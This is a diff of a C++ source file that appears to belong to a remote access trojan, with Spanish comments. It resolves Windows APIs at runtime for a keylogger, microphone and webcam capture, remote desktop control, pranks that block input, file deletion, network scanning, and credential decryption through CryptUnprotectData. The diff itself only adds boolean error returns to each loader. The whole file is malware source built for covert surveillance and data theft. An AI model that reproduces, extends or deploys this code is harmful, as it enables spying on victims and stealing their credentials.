@@ -99,18 +99,26 @@ DynamicLoad::DynamicLoad() {
 }
 
 //Bromas
-void DynamicLoad::LoadFunProcs() {
+bool DynamicLoad::LoadFunProcs() {
     LOAD_DLL(this->hWinmmDLL, "winmm.dll");
     
     if (this->hWinmmDLL) {
         this->WINMM.pMciSendStringA = (st_Winmm::LPMCISENDSTRINGA)wrapGetProcAddr(this->hWinmmDLL, "mciSendStringA");
+    }else {
+        __DBG_("[X] LoadFunProcs err hWinmmDLL");
+        return false;
     }
 
     if (this->hUser32DLL) {
         this->USER32_FUN.pSwapMouseButton = (st_User32_Fun::LPSWAPMOUSEBUTTON)wrapGetProcAddr(this->hUser32DLL, "SwapMouseButton");
         this->USER32_FUN.pBlockInput = (st_User32_Fun::LPBLOCKINPUT)wrapGetProcAddr(this->hUser32DLL, "BlockInput");
         this->USER32_FUN.pMessageBoxA = (st_User32_Fun::LPMESSAGEBOX)wrapGetProcAddr(this->hUser32DLL, "MessageBoxA");
+    }else {
+        __DBG_("[X] LoadFunProcs err hUser32DLL");
+        return false;
     }
+
+    return true;
 }
 
 void DynamicLoad::UnloadFunDlls() {
@@ -118,7 +126,7 @@ void DynamicLoad::UnloadFunDlls() {
 }
 
 //Administrador de ventanas
-void DynamicLoad::LoadWMProcs() {
+bool DynamicLoad::LoadWMProcs() {
     if (this->hUser32DLL) {
         this->USER32_WM.pIsWindowVisible = (st_User32_WM::LPISWINDOWVISIBLE)wrapGetProcAddr(this->hUser32DLL, "IsWindowVisible");
         this->USER32_WM.pGetWindowTextA = (st_User32_WM::LPGETWINDOWTEXTA)wrapGetProcAddr(this->hUser32DLL, "GetWindowTextA");
@@ -126,11 +134,16 @@ void DynamicLoad::LoadWMProcs() {
         this->USER32_WM.pEnumWindows = (st_User32_WM::LPENUMWINDOWS)wrapGetProcAddr(this->hUser32DLL, "EnumWindows");
         this->USER32_WM.pFindWindowA = (st_User32_WM::LPFINDWINDOWA)wrapGetProcAddr(this->hUser32DLL, "FindWindowA");
         this->USER32_WM.pShowWindow = (st_User32_WM::LPSHOWWINDOW)wrapGetProcAddr(this->hUser32DLL, "ShowWindow");
+    }else {
+        __DBG_("[X] LoadWMProcs err hUser32DLL");
+        return false;
     }
+
+    return true;
 }
 
 //Escritorio Remoto
-void DynamicLoad::LoadRDProcs() {
+bool DynamicLoad::LoadRDProcs() {
     LOAD_DLL(this->hGdi32DLL, "gdi32.dll");
     LOAD_DLL(this->hGdiPlusDLL, "gdiplus.dll");
     LOAD_DLL(this->hOle32, "ole32.dll");
@@ -147,6 +160,9 @@ void DynamicLoad::LoadRDProcs() {
         this->USER32_RD.pDrawIconEx = (st_User32_RD::LPDRAWICONEX)wrapGetProcAddr(this->hUser32DLL, "DrawIconEx");
         this->USER32_RD.pGetWindowRect = (st_User32_RD::LPGETWINDOWRECT)wrapGetProcAddr(this->hUser32DLL, "GetWindowRect");
 		this->USER32_RD.pSetCursorPos = (st_User32_RD::LPSETCURSORPOS)wrapGetProcAddr(this->hUser32DLL, "SetCursorPos");
+    }else {
+        __DBG_("[X] LoadRDProcs err hUser32DLL");
+        return false;
     }
 
     if (this->hGdi32DLL) {
@@ -157,12 +173,18 @@ void DynamicLoad::LoadRDProcs() {
         this->GDI32_RD.pBitBlt = (st_Gdi32::LPBITBLT)wrapGetProcAddr(this->hGdi32DLL, "BitBlt");
         this->GDI32_RD.pDeleteDC = (st_Gdi32::LPDELETEDC)wrapGetProcAddr(this->hGdi32DLL, "DeleteDC");
         this->GDI32_RD.pDeleteObject = (st_Gdi32::LPDELETEOBJECT)wrapGetProcAddr(this->hGdi32DLL, "DeleteObject");
+    } else {
+        __DBG_("[X] LoadRDProcs err hGdi32DLL");
+        return false;
     }
 
     if (this->hOle32) {
         this->OLE32.pCreateStreamOnHGlobal = (st_Ole32::LPCREATESTREAMONHGLOBAL)wrapGetProcAddr(this->hOle32, "CreateStreamOnHGlobal");
         this->OLE32.pCoInitialize = (st_Ole32::LPCOINITIALIZE)wrapGetProcAddr(this->hOle32, "CoInitialize");
         this->OLE32.pCoUninitialize = (st_Ole32::LPCOUNITIALIZE)wrapGetProcAddr(this->hOle32, "CoUninitialize");
+    }else {
+        __DBG_("[X] LoadRDProcs err hOle32");
+        return false;
     }
 
     if (this->hGdiPlusDLL) {
@@ -182,7 +204,12 @@ void DynamicLoad::LoadRDProcs() {
         this->GDIPLUS_RD.pGdipDisposeImage = (st_GdiPlus::LPGDIPDISPOSEIMAGE)wrapGetProcAddr(this->hGdiPlusDLL, "GdipDisposeImage");
         this->GDIPLUS_RD.pGdipLoadImageFromStream = (st_GdiPlus::LPGDIPLOADIMAGEFROMSTREAM)wrapGetProcAddr(this->hGdiPlusDLL, "GdipLoadImageFromStream");
         this->GDIPLUS_RD.pGdipCreateBitmapFromStream = (st_GdiPlus::LPGDIPCREATEBITMAPFROMSTREAM)wrapGetProcAddr(this->hGdiPlusDLL, "GdipCreateBitmapFromStream");
+    }else {
+        __DBG_("[X] LoadRDProcs err hGdiPlusDLL");
+        return false;
     }
+
+    return true;
 }
 
 void DynamicLoad::UnloadRDDlls() {
@@ -192,7 +219,7 @@ void DynamicLoad::UnloadRDDlls() {
 }
 
 //Microfono
-void DynamicLoad::LoadMicProcs() {
+bool DynamicLoad::LoadMicProcs() {
     LOAD_DLL(this->hWinmmDLL, "winmm.dll");
 
     if (this->hWinmmDLL) {
@@ -205,7 +232,12 @@ void DynamicLoad::LoadMicProcs() {
         this->WINMMMIC.pWaveInPrepareHeader = (st_WinmmMic::LPWAVEINPREPAREHEADER)wrapGetProcAddr(this->hWinmmDLL, "waveInPrepareHeader");
         this->WINMMMIC.pWaveInUnprepareHeader = (st_WinmmMic::LPWAVEINUNPREPAREHEADER)wrapGetProcAddr(this->hWinmmDLL, "waveInUnprepareHeader");
         this->WINMMMIC.pWaveInAddBuffer = (st_WinmmMic::LPWAVEINADDBUFFER)wrapGetProcAddr(this->hWinmmDLL, "waveInAddBuffer");
+    }else {
+        __DBG_("[X] LoadMicProcs err hWinmmDLL");
+        return false;
     }
+
+    return true;
 }
 
 void DynamicLoad::UnloadMicProcs() {
@@ -213,9 +245,12 @@ void DynamicLoad::UnloadMicProcs() {
 }
 
 //Keylogger
-void DynamicLoad::LoadKLProcs() {
+bool DynamicLoad::LoadKLProcs() {
     if (this->hKernel32DLL) {
         this->KERNEL32.pGetModuleHandleA = (st_Kernel32::LPGETMODULEHANDLEA)wrapGetProcAddr(this->hKernel32DLL, "GetModuleHandleA");
+    }else {
+        __DBG_("[X] LoadKLProcs err hKernel32DLL");
+        return false;
     }
 
     if (this->hUser32DLL) {
@@ -229,11 +264,16 @@ void DynamicLoad::LoadKLProcs() {
         this->USER32_KL.pGetMessageA = (st_User32_KL::LPGETMESSAGEA)wrapGetProcAddr(this->hUser32DLL, "GetMessageA");
         this->USER32_KL.pTranslateMessage = (st_User32_KL::LPTRANSLATEMESSAGE)wrapGetProcAddr(this->hUser32DLL, "TranslateMessage");
         this->USER32_KL.pDispatchMessageA = (st_User32_KL::LPDISPATCHMESSAGEA)wrapGetProcAddr(this->hUser32DLL, "DispatchMessageA");
+    }else {
+        __DBG_("[X] LoadKLProcs err hUser32DLL");
+        return false;
     }
+
+    return true;
 }
 
 //Informacion
-void DynamicLoad::LoadInfoProcs() {
+bool DynamicLoad::LoadInfoProcs() {
     LOAD_DLL(this->hBCryptDLL, "Bcrypt.dll");
     LOAD_DLL(this->hCrypt32DLL, "Crypt32.dll");
     LOAD_DLL(this->hNetApi32DLL, "Netapi32.dll");
@@ -244,16 +284,27 @@ void DynamicLoad::LoadInfoProcs() {
         this->BCRYPT.pBCryptOpenAlgorithmProvider = (st_Bcrypt::LPLPBCRYPTOPENALGORITHMPROVIDER)wrapGetProcAddr(this->hBCryptDLL, "BCryptOpenAlgorithmProvider");
         this->BCRYPT.pBCryptCloseAlgorithmProvider = (st_Bcrypt::LPBCRYPTCLOSEALGORITHMPROVIDER)wrapGetProcAddr(this->hBCryptDLL, "BCryptCloseAlgorithmProvider");
         this->BCRYPT.pBCryptSetProperty = (st_Bcrypt::LPBCRYPTSETPROPERTY)wrapGetProcAddr(this->hBCryptDLL, "BCryptSetProperty");
+    }else {
+        __DBG_("[X] LoadInfoProcs err hBCryptDLL");
+        return false;
     }
 
     if (hCrypt32DLL) {
         this->CRYPT32.pCryptUnprotectData = (st_Crypt32::LPCRYPTUNPROTECTDATA)wrapGetProcAddr(this->hCrypt32DLL, "CryptUnprotectData");
+    }else {
+        __DBG_("[X] LoadInfoProcs err hCrypt32DLL");
+        return false;
     }
 
     if (hNetApi32DLL) {
         this->NETAPI32.pNetUserEnum = (st_Netapi32::LPNETUSERENUM)wrapGetProcAddr(this->hNetApi32DLL, "NetUserEnum");
         this->NETAPI32.pNetApiBufferFree = (st_Netapi32::LPNETAPIBUFFERFREE)wrapGetProcAddr(this->hNetApi32DLL, "NetApiBufferFree");
+    }else {
+        __DBG_("[X] LoadInfoProcs err hNetApi32DLL");
+        return false;
     }
+
+    return true;
 }
 
 void DynamicLoad::UnloadInfoProcs() {
@@ -263,7 +314,7 @@ void DynamicLoad::UnloadInfoProcs() {
 }
 
 //Adm archivos
-void DynamicLoad::LoadFMProcs() {
+bool DynamicLoad::LoadFMProcs() {
     if (this->hKernel32DLL) {
         this->KERNEL32_FM.pGetLogicalDriveStringsA = (st_Kernel32_FM::LPGETLOGICALDRIVESTRINGSA)wrapGetProcAddr(this->hKernel32DLL, "GetLogicalDriveStringsA");
         this->KERNEL32_FM.pGetVolumeInformationA = (st_Kernel32_FM::LPGETVOLUMEINFORMATIONA)wrapGetProcAddr(this->hKernel32DLL, "GetVolumeInformationA");
@@ -279,11 +330,16 @@ void DynamicLoad::LoadFMProcs() {
         this->KERNEL32_FM.pDeleteFileA = (st_Kernel32_FM::LPDELETEFILEA)wrapGetProcAddr(this->hKernel32DLL, "DeleteFileA");
         this->KERNEL32_FM.pMoveFileA = (st_Kernel32_FM::LPMOVEFILEA)wrapGetProcAddr(this->hKernel32DLL, "MoveFileA");
         this->KERNEL32_FM.pRemoveDirectoryA = (st_Kernel32_FM::LPREMOVEDIRECTORYA)wrapGetProcAddr(this->hKernel32DLL, "RemoveDirectoryA");
+    }else {
+        __DBG_("[X] LoadFMProcs err hKernel32DLL");
+        return false;
     }
+
+    return true;
 }
 
 //Camara
-void DynamicLoad::LoadCamProcs() {
+bool DynamicLoad::LoadCamProcs() {
     LOAD_DLL(this->hShlwapiDLL, "Shlwapi.dll");
     LOAD_DLL(this->hMfplatDLL, "Mfplat.dll");
     LOAD_DLL(this->hMfDLL, "Mf.dll");
@@ -299,10 +355,16 @@ void DynamicLoad::LoadCamProcs() {
         this->GDIPLUS_RD.pGdipSaveImageToStream = (st_GdiPlus::LPGDIPSAVEIMAGETOSTREAM)wrapGetProcAddr(this->hGdiPlusDLL, "GdipSaveImageToStream");
         this->GDIPLUS_RD.pGdipCreateBitmapFromStream = (st_GdiPlus::LPGDIPCREATEBITMAPFROMSTREAM)wrapGetProcAddr(this->hGdiPlusDLL, "GdipCreateBitmapFromStream");
         this->GDIPLUS_RD.pGdipDisposeImage = (st_GdiPlus::LPGDIPDISPOSEIMAGE)wrapGetProcAddr(this->hGdiPlusDLL, "GdipDisposeImage");
+    }else {
+        __DBG_("[X] LoadCamProcs err hGdiPlusDLL");
+        return false;
     }
 
     if (this->hShlwapiDLL) {
         this->SHLWAPI.pSHCreateMemStream = (st_Shlwapi::LPSHCREATEMEMSTREAM)wrapGetProcAddr(this->hShlwapiDLL, "SHCreateMemStream");
+    }else {
+        __DBG_("[X] LoadCamProcs err hShlwapiDLL");
+        return false;
     }
 
     if (this->hMfplatDLL) {
@@ -313,16 +375,25 @@ void DynamicLoad::LoadCamProcs() {
         this->MFPLAT.pMFCreateMediaType = (st_Mfplat::LPMFCREATEMEDIATYPE)wrapGetProcAddr(this->hMfplatDLL, "MFCreateMediaType");
         this->MFPLAT.pMFCreateSample = (st_Mfplat::LPMFCREATESAMPLE)wrapGetProcAddr(this->hMfplatDLL, "MFCreateSample");
         this->MFPLAT.pMFCreateMemoryBuffer = (st_Mfplat::LPMFCREATEMEMORYBUFFER)wrapGetProcAddr(this->hMfplatDLL, "MFCreateMemoryBuffer");
+    }else {
+        __DBG_("[X] LoadCamProcs err hMfplatDLL");
+        return false;
     }
     
     if (this->hMfDLL) {
         this->MF.pMFEnumDeviceSources = (st_Mf::LPMFENUMDEVICESOURCES)wrapGetProcAddr(this->hMfDLL, "MFEnumDeviceSources");
+    }else {
+        __DBG_("[X] LoadCamProcs err hMfDLL");
+        return false;
     }
 
     if (this->hMfreadwriteDLL) {
         this->MFREADWRITE.pMFCreateSourceReaderFromMediaSource =
             (st_Mfreadwrite::LPMFCREATESOURCEREADERFROMMEDIASOURCE)
             wrapGetProcAddr(this->hMfreadwriteDLL, "MFCreateSourceReaderFromMediaSource");
+    }else {
+        __DBG_("[X] LoadCamProcs err hMfreadwriteDLL");
+        return false;
     }
 
     if (this->hOle32) {
@@ -331,7 +402,12 @@ void DynamicLoad::LoadCamProcs() {
         this->OLE32.pCreateStreamOnHGlobal = (st_Ole32::LPCREATESTREAMONHGLOBAL)wrapGetProcAddr(this->hOle32, "CreateStreamOnHGlobal");
         this->OLE32.pCoInitialize = (st_Ole32::LPCOINITIALIZE)wrapGetProcAddr(this->hOle32, "CoInitialize");
         this->OLE32.pCoUninitialize = (st_Ole32::LPCOUNITIALIZE)wrapGetProcAddr(this->hOle32, "CoUninitialize");
+    }else {
+        __DBG_("[X] LoadCamProcs err hOle32");
+        return false;
     }
+
+    return true;
 }
 
 void DynamicLoad::UnloadCamPros() {
@@ -345,14 +421,19 @@ void DynamicLoad::UnloadCamPros() {
 }
 
 //Escaner
-void DynamicLoad::LoadNetProcs() {
+bool DynamicLoad::LoadNetProcs() {
     LOAD_DLL(this->hIphlpDLL, "Iphlpapi.dll");
     
     if (this->hIphlpDLL) {
         this->IPHLAPI.pIcmpCreateFile = (st_Iphl::LPICMPCREATEFILE)wrapGetProcAddr(this->hIphlpDLL, "IcmpCreateFile");
         this->IPHLAPI.pIcmpSendEcho = (st_Iphl::LPICMPSENDECHO)wrapGetProcAddr(this->hIphlpDLL, "IcmpSendEcho");
         this->IPHLAPI.pSendARP = (st_Iphl::LPSENDARP)wrapGetProcAddr(this->hIphlpDLL, "SendARP");
+    }else {
+        __DBG_("[X] LoadNetProcs err hIphlpDLL");
+        return false;
     }
+
+    return true;
 }
 
 void DynamicLoad::UnloadNetProcs() {
@@ -360,7 +441,7 @@ void DynamicLoad::UnloadNetProcs() {
 }
 
 //Winsock
-void DynamicLoad::LoadWS2Procs() {
+bool DynamicLoad::LoadWS2Procs() {
     if (this->hWs2_32DLL) {
         this->WS32.pWsaStartup = (st_Ws2_32::LPWSASTARTUP)wrapGetProcAddr(this->hWs2_32DLL, "WSAStartup");
         this->WS32.pWSACleanup = (st_Ws2_32::LPWSACLEANUP)wrapGetProcAddr(this->hWs2_32DLL, "WSACleanup");
@@ -382,7 +463,12 @@ void DynamicLoad::LoadWS2Procs() {
         this->WS32.pInetptoN = (st_Ws2_32::LPINETNPTON)wrapGetProcAddr(this->hWs2_32DLL, "inet_pton");
         this->WS32.pGetNameInfo = (st_Ws2_32::LPGETNAMEINFO)wrapGetProcAddr(this->hWs2_32DLL, "getnameinfo");
         this->WS32.p__WSAFDIsSet = (st_Ws2_32::LPWSAFDISSET)wrapGetProcAddr(this->hWs2_32DLL, "__WSAFDIsSet");
+    }else {
+        __DBG_("[X] LoadWS2Procs err hWs2_32DLL");
+        return false;
     }
+
+    return true;
 }
 
 DynamicLoad::~DynamicLoad() {
